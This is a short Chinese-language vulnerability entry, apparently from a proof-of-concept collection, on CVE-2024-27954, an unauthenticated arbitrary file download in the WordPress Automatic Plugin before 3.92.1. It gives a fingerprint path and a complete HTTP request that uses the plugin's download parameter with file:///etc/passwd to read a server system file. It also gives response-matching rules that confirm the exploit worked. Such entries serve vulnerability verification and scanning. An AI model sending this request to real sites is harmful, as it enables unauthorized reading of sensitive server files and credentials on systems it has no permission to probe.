﻿# WordPress Automatic Plugin任意文件下载漏洞

> 更新时间：2024-03-29

> 漏洞编号：CVE-2024-27954

> 漏洞说明：WordPress Automatic Plugin 是一个WordPress插件，可以帮助用户自动化他们的WordPress网站内容更新。该插件可以从各种来源自动抓取内容，例如RSS Feeds、eBay、Amazon、YouTube等，并将这些内容发布到您的WordPress网站上。WordPress Automatic Plugin 小于 3.92.1 的版本存在任意文件下载漏洞，未授权的攻击者可以通过该漏洞下载服务器的任意文件，从而获取大量敏感信息。

> 漏洞特征："/wp-content/plugins/wp-automatic"

> 验证脚本：HTTP

```
GET /?p=3232&wp_automatic=download&link=file:///etc/passwd HTTP/1.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：WordPress Automatic Plugin任意文件下载漏洞.poc

